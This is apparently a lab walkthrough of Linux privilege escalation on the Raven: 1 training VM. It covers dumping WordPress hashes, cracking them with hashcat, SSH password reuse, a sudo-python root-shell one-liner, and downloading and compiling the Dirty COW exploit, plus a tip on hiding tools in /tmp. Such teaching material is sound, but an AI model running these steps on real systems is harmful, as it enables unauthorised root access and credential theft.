---
title: "Privilege Escalation Techniques"
date: "2026-04-015"
summary: "A Concise Guide to Linux Privilege Escalation Using Kernel Exploits and Misconfigured Sudo Rules"
tags: ["privEsc", "sudo exploits", "kernel exploits"]
---

## 1. Prerequisites and Lab Setup

To follow along with the tools and techniques utilized in this scenario, you will need to use one of the following offensive Linux distributions:

* Kali Linux
* Parrot OS

The demonstrations outlined in this scenario were performed against a vulnerable Linux VM designed to teach the process of exploitation and privilege escalation. If you want to follow along, you can download the target VM here: [Raven: 1 (VulnHub)](https://www.vulnhub.com/entry/raven-1,256/).

To get the most out of this scenario, it is recommended to have the following technical prerequisites:

* `1.` Familiarity with Linux system administration.
* `2.` A functional knowledge of TCP/IP and networking.
* `3.` Familiarity with penetration testing concepts and the attack life-cycle.

> **Note:** The techniques and tools demonstrated in this scenario were performed using a Kali Linux Virtual Machine.

---

## 2. MITRE ATT&CK Privilege Escalation Techniques

Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include:

* `1.` SYSTEM/root level
* `2.` local administrator
* `3.` user account with admin-like access
* `4.` user accounts with access to specific system or perform specific function

![mitre](https://raw.githubusercontent.com/Shubhankargupta691/portfolio/75a9f2c46e7d9416cfdc6be04c836e6063596c30/src/assets/blog/PrivEsc/image1.png)

The following is a list of key techniques and sub-techniques that we will be exploring:

* `1.` Local Accounts
* `2.` Exploiting misconfigured SUDO Permissions
* `3.` Kernel Exploits

## Scenario
Our objective is to elevate our privileges to that of the "root" user on the target server.

## Infrastructure

The following diagram illustrates the various operating systems we will use and their requirements.

![Raven scenario diagram](https://github.com/Shubhankargupta691/portfolio/blob/0d92129b64b41b7859f61732e5ba2061b4a3b8a5/src/assets/blog/raven/image2.png?raw=true)

## Local Accounts

**Local Account Credential Reuse** is a privilege escalation technique where attackers obtain local account credentials and exploit password reuse to gain higher privileges. Local accounts are created for users, services, remote support, or administration on a single system.

Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.

Local Accounts may also be abused to elevate privileges and harvest credentials through OS Credential Dumping. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.

During the initial exploitation phase, **[Exploiting Vulnerable WordPress & MySQL](https://shubhankar-gupta.vercel.app/writing/exploiting-linux-server/)**, we gained access to the MySQL server on the target system, consequently, we can utilize our newfound access to dump the user account credentials from the WordPress database and test the credentials for password reuse.


The first step will involve logging in to the MySQL database server with the credentials we obtained. This can be done by running the following command:

```bash
mysql -u root -pR@v3nSecurity
```
![wordpress](https://raw.githubusercontent.com/Shubhankargupta691/portfolio/0d92129b64b41b7859f61732e5ba2061b4a3b8a5/src/assets/blog/raven/image21.png)

After logging in, we can select the WordPress database by running the following command:
```bash
use wordpress;
```
Now We can get a listing of all the tables in the WordPress database by running the following command:
```bash
show tables;
```
As shown in the following screenshot, the output displays all the tables associated with the WordPress installation.

![tables](https://raw.githubusercontent.com/Shubhankargupta691/portfolio/0d92129b64b41b7859f61732e5ba2061b4a3b8a5/src/assets/blog/raven/image23.png)

```bash
select * from wp_users;
```
We can dump the contents of the wp_users table by running the following command:

![tables](https://raw.githubusercontent.com/Shubhankargupta691/portfolio/0d92129b64b41b7859f61732e5ba2061b4a3b8a5/src/assets/blog/raven/image24.png)

Since we have already recovered the password for the user `michael`, we can now focus on cracking the password hash for the user `steven`. As WordPress stores passwords as MD5 hashes, we need to crack `steven`'s hash to recover the plaintext password.


## Cracking MD5 Hashes With Hashcat


To crack the hashes, we will use Hashcat in mode 400 (phpass) together with the rockyou.txt wordlist by running the following command:

```bash
hashcat -m 400 -a 0 --username hash.txt /usr/share/wordlists/rockyou.txt
```
As shown in the following screenshot, Hashcat successfully cracks both password hashes, revealing the plaintext passwords for the michael and steven accounts.

![hashcat](https://raw.githubusercontent.com/Shubhankargupta691/portfolio/0d92129b64b41b7859f61732e5ba2061b4a3b8a5/src/assets/blog/raven/image25.png)

After the cracking process completes, we can display the recovered credentials by running the following command:

```bash
hashcat -m 400 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --show --username
```

This command displays the username, password hash, and the corresponding cracked plaintext password for each recovered account.

![users info](https://github.com/Shubhankargupta691/portfolio/blob/0d92129b64b41b7859f61732e5ba2061b4a3b8a5/src/assets/blog/raven/image26.png?raw=true)


```bash
michael:$P$B4lAaqWVihy1adIqSeafBQNHLenwy21:password123
steven:$P$BYihUNzdZ16QJEO/rD.Ze9pPDzQ9oQ0:pink84
```

We can now use this password to log in to WordPress. Alternatively, we can also attempt to log in as the user “steven” via SSH in order to determine if the password has been reused.

This can be acheived by running the following command:

```bash
ssh steven@raven.local
```
![steven](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/raven/image28.png?raw=true)

The command prompts for `steven`'s password. After entering the recovered password, we successfully authenticate and gain access to a second local account, expanding our control over the target system.

Initial enumeration shows that `steven` is not a privileged user. However, we can continue enumerating the system to identify any misconfigurations or permissions that could be leveraged for further privilege escalation.

## Exploiting Misconfigured SUDO Permissions


After successfully logging in as steven, we can upgrade it to an interactive Bash shell:

```bash
/bin/bash -i
```
![shell](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/raven/image29.png?raw=true)

Now we can check the commands the user is permitted to execute with sudo:

```bash
sudo -l
```
As shown in the following screenshot, the `sudo -l` output reveals that the steven user can execute `/usr/bin/python` with sudo and without a password (NOPASSWD).

![sudo](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/raven/image30.png?raw=true)


Alternatively, we can automate the enumeration process using **LinPEAS** to identify potential privilege escalation vectors. The enumeration results also reveal that `python` can be executed with elevated privileges.

To determine how this binary can be abused, we refer to **GTFOBins**, which documents privilege escalation techniques for legitimate Unix binaries. The `python` entry provides a payload that spawns a root shell when executed with the appropriate privileges.:

![sudo](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/raven/image31.png?raw=true)


```bash
sudo /usr/bin/python -c 'import os; os.execl("/bin/sh", "sh")'
```
Executing this command spawns a shell with root privileges, successfully escalating our access.

![exploit](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/raven/image32.png?raw=true)

After obtaining a root shell, we can upgrade it to an interactive Bash shell:

```bash
/bin/bash -i
```

![root](https://github.com/Shubhankargupta691/portfolio/blob/main/src/assets/blog/raven/image33.png?raw=true)

Finally, running the `whoami` command confirms that we have successfully escalated our privileges to the root user.

## Kernel Exploits

The final privilege escalation technique involves exploiting a vulnerable Linux kernel to obtain elevated privileges. Although frameworks such as Metasploit can automate this process, we will manually identify, compile, and execute a suitable kernel exploit.

Kernel exploits should be considered a last-resort technique, as they interact directly with the kernel and may result in system instability, kernel panics, or data loss. Additionally, a vulnerable kernel does not guarantee successful privilege escalation.

The first step is to identify potential kernel vulnerabilities. This can be automated using **Linux-Exploit-Suggester**, a privilege escalation auditing tool that analyzes the target system and recommends applicable kernel exploits.

Repository: https://github.com/mzet-/linux-exploit-suggester

To begin, transfer the `linux-exploit-suggester` script to the target system by executing the following command:

```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
```

**Note:** It is always recommended to store scripts and tools in a directory that is not frequently accessed, such as **/tmp**, to reduce the likelihood of detection or interference.

![les](https://raw.githubusercontent.com/Shubhankargupta691/portfolio/75a9f2c46e7d9416cfdc6be04c836e6063596c30/src/assets/blog/PrivEsc/image2.png)

After transferring the script to the target system, grant it execute permissions using the following command:

```bash
chmod +x /tmp/les.sh
```
We can now execute the script on the target system by running the following command:

```bash
./les.sh
```
As shown in the following screenshot, the script outputs a list of kernel vulnerabilities applicable to the target's kernel version and Linux distribution.

![les](https://raw.githubusercontent.com/Shubhankargupta691/portfolio/75a9f2c46e7d9416cfdc6be04c836e6063596c30/src/assets/blog/PrivEsc/image4.png)

The output lists the identified kernel exploits for the detected kernel version and Linux distribution. Based on the results, **Dirty COW (CVE-2016-5195)** is a suitable exploit for the target system.

`Linux-Exploit-Suggester` also provides reference links describing the vulnerability and download links for the corresponding exploit source code. In this case, the Dirty COW exploit can be obtained from Exploit-DB:

https://www.exploit-db.com/exploits/40839

After downloading the exploit source code, review it to verify the target requirements and compilation instructions before compiling and executing the exploit.


![db](https://raw.githubusercontent.com/Shubhankargupta691/portfolio/75a9f2c46e7d9416cfdc6be04c836e6063596c30/src/assets/blog/PrivEsc/image5.png)

This exploit leverages the Dirty COW vulnerability to modify the `/etc/passwd` file and create a new user account with root privileges. When executed, it prompts for a password for the newly created account. Upon successful exploitation, the new account can be used to authenticate with root privileges.

After reviewing the exploit, download the source code to the target system and compile it by executing the following command:

```bash
wget https://www.exploit-db.com/download/40839
```

![db](https://raw.githubusercontent.com/Shubhankargupta691/portfolio/75a9f2c46e7d9416cfdc6be04c836e6063596c30/src/assets/blog/PrivEsc/image6.png)

```bash
mv 40839 40839.c
```
After downloading the exploit source code to the target system, compile it using GCC (GNU C Compiler) by executing the following command:

```bash
gcc -pthread 40839.c -o exploit -lcrypt
```
If the compilation completes successfully, an executable binary is generated. Execute the compiled binary using the following command:

![gcc](https://raw.githubusercontent.com/Shubhankargupta691/portfolio/75a9f2c46e7d9416cfdc6be04c836e6063596c30/src/assets/blog/PrivEsc/image7.png)

Now we have to assign the executable permission to our exploit using the following command:
```bash
chmod +x exploit

./exploit
```
![gcc](https://raw.githubusercontent.com/Shubhankargupta691/portfolio/75a9f2c46e7d9416cfdc6be04c836e6063596c30/src/assets/blog/PrivEsc/image8.png)

When the exploit is executed, it prompts for a password for the new user account. If the exploitation is successful, a privileged user account named `firefart` is created, unless the username has been modified in the source code.

The exploit may take a few seconds to complete. Once finished, verify that the `firefart` account has been added, as shown in the following screenshot.


Execute the compiled exploit and specify a password when prompted. If the exploitation is successful, the binary creates a new root-privileged user account named `firefart` by default, unless the username has been modified in the source code.

After the exploit completes, verify that the `firefart` account has been added to the system, as shown in the following screenshot.

![firefart](https://raw.githubusercontent.com/Shubhankargupta691/portfolio/75a9f2c46e7d9416cfdc6be04c836e6063596c30/src/assets/blog/PrivEsc/image9.png)

In this case, inspecting the `/etc/passwd` file confirms that the `firefart` account was not created, indicating that the exploit did not successfully achieve privilege escalation.

![firefart](https://raw.githubusercontent.com/Shubhankargupta691/portfolio/75a9f2c46e7d9416cfdc6be04c836e6063596c30/src/assets/blog/PrivEsc/image10.png)

Since root privileges had already been obtained by exploiting a misconfigured `sudo` configuration, there was no need to continue with this escalation vector. This demonstrates that kernel exploits are not always successful, and privilege escalation often requires evaluating and testing multiple techniques before identifying a viable path.
